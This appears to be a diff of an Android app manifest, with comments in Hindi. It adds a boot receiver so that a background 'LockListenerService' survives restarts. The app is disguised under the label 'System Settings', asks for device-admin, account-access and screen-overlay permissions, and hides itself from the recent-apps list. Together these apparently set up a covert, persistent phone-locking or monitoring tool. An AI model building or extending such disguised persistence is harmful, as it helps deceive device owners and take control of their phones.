@@ -5,9 +5,10 @@
     <uses-permission android:name="android.permission.MANAGE_DEVICE_ADMINS" />
     <uses-permission android:name="android.permission.GET_ACCOUNTS" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <!-- बैकग्राउंड में हमेशा ज़िंदा रहने के लिए नई परमिशन्स -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <!-- रीस्टार्ट पकड़ने के लिए नई परमिशन -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
         android:label="System Settings"
@@ -27,11 +28,18 @@
             android:excludeFromRecents="true"
             android:exported="false" />
 
-        <!-- सर्विस को dataSync टाइप दिया गया है ताकि यह बैकग्राउंड में Firebase से कनेक्ट रहे -->
         <service 
             android:name=".LockListenerService" 
             android:exported="false"
             android:foregroundServiceType="dataSync"/>
+
+        <!-- फोन रीस्टार्ट होने का अलार्म (Boot Receiver) -->
+        <receiver android:name=".BootReceiver" android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
 
         <receiver
             android:name=".MyAdminReceiver"
